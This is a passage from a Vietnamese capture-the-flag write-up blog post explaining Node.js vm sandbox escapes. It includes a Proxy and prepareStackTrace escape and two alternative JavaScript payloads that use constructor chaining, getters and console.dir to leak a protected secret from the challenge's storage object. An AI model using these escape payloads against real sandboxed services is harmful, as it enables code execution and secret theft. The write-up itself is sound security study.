</span></span></code></pre></div><p>Đầu tiên thì cứ phân tích payload này trước, đầu tiên gán một Proxy cho hàm <code>toString</code> của <code>Error.name</code>, khi <code>Error.name.toString</code> được gọi nó sẽ trigger method <code>apply</code> của proxy, khi gọi <code>a.stack</code> thì ở internal side của nodejs <code>prepareStackTrace</code> sẽ được gọi và gọi đến <code>Error.name.toString</code>, đây là để escape ra khỏi <code>vm</code>. Đoạn <code>throw (...)</code> sẽ được chạy, bằng cách handle exception ở bên ngoài thì ta có thể catch lại kết quả của câu lệnh vừa chạy và return nó về. Sau khi xem xong mình vẫn không hiểu vì sao cách của author được, hơi ảo nhưng có lẽ mình sẽ tìm hiểu và update sau</p>
<p>UPDATE: thật ra đây là vấn đề của thằng burpsuite cơ, payload mình oke =))) đm burpsuite, me go for postman</p>


<h3 class="relative group">Unintendeds 
    <div id="unintendeds" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#unintendeds" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="p">({</span> <span class="nx">toJSON</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">k</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="sb">`globalThis.storage.__defineGetter__(&#39;p&#39;, function(){ return this.secret });return btoa(globalThis.storage.p);`</span><span class="p">)()},</span> <span class="nx">toString</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">k</span> <span class="p">})})()</span>
</span></span></code></pre></div><p>Vì getter sẽ được invoke sau khi Proxy handle xong, nếu thời điểm mà getter của <code>p</code> chạy thì <code>this.secret</code> lúc này sẽ không còn invoke <code>get</code> của Proxy nữa</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7fb75684-b37b-4afd-ae41-f94c778d3543" alt="image" />
    
  </figure>
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">new</span> <span class="nb">Proxy</span><span class="p">(</span><span class="nx">_</span><span class="p">=&gt;</span><span class="nx">_</span> <span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">get</span><span class="o">:</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">(</span><span class="nx">_</span><span class="p">=&gt;</span><span class="nx">_</span> <span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">apply</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">thisArg</span><span class="p">,</span> <span class="nx">argumentsList</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="nx">argumentsList</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">            let leak;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const stream = secureRequire(&#39;stream&#39;);
</span></span></span><span class="line"><span class="cl"><span class="sb">            const console = secureRequire(&#39;console&#39;);
</span></span></span><span class="line"><span class="cl"><span class="sb">            const out = stream.Writable({
</span></span></span><span class="line"><span class="cl"><span class="sb">                write(data) {
</span></span></span><span class="line"><span class="cl"><span class="sb">                    leak = data;
</span></span></span><span class="line"><span class="cl"><span class="sb">                }
</span></span></span><span class="line"><span class="cl"><span class="sb">            });
</span></span></span><span class="line"><span class="cl"><span class="sb">            const logger = new console.Console({ stdout: out });
</span></span></span><span class="line"><span class="cl"><span class="sb">            logger.dir(storage);
</span></span></span><span class="line"><span class="cl"><span class="sb">            return Array.from(leak).toString();
</span></span></span><span class="line"><span class="cl"><span class="sb">          `</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>Cách này cũng khá hay, override method write và cho console.dir (console.dir sẽ không invoke <code>get</code> của Proxy, cũng như getter) lưu data vào một biến và trả về</p>

          
          
          
        </div>
        
        

        
        

        


<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
  
  

  <a href="/posts/imaginaryctf-2024/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/imaginaryctf-2024/feature-i.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/imaginaryctf-2024/">ImaginaryCTF 2024</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-04-27T00:00:00&#43;00:00">27 April 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/misc/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Misc
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
  

  <a href="/posts/hacktheon-2024/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/hacktheon-2024/featurehacktheon.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/hacktheon-2024/">Hacktheon 2024: Account</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-05-02T00:00:00&#43;00:00">2 May 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/pwnable/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Pwnable
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
  

  <a href="/posts/ictf-2023/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/ictf-2023/feature-i.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/ictf-2023/">The journy deep down to the pickle machine</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2023-04-27T00:00:00&#43;00:00">27 April 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">11 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/misc/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Misc
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
</section>

  
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/CR3-2024\/index.md"
        var oid_likes = "likes_posts\/CR3-2024\/index.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.4c1d8e0f53a5b5b7bccae87750581a0a393723aae9a9ae5622497d488b9689a4fd64a34846876e449a065aed64df10f9219b8df359a87371b998dd8bf58a1da5.js" integrity="sha512-TB2OD1Oltbe8yuh3UFgaCjk3I6rpqa5WIkl9SIuWiaT9ZKNIRoduRJoGWu1k3xD5IZuN81moc3G5mN2L9YodpQ=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/hacktheon-2024/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Hacktheon 2024: Account</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-05-02T00:00:00&#43;00:00">2 May 2024</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/airflow-research/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Apache Airflow not so Remote Code Execution</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-05-20T00:00:00&#43;00:00">20 May 2024</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex flex-col list-none sm:flex-row">
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
            title="Tags">
            
            tags
          </a>
        </li>
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
            title="Categories">
            
            categories
          </a>
        </li>
        
      </ul>
    </nav>
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      Copyright © Shin24
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.330c9c7ed3478d29ddc83242e05f3636088799f250f724e0eee3b88057e4e288861cf148972d2ac1ed5972c27193c1c919d768bf5e52f6ef01d3abc3b16df7c2.js" integrity="sha512-MwycftNHjSndyDJC4F82NgiHmfJQ9yTg7uO4gFfk4oiGHPFIly0qwe1ZcsJxk8HJGddov15S9u8B06vDsW33wg=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="//localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
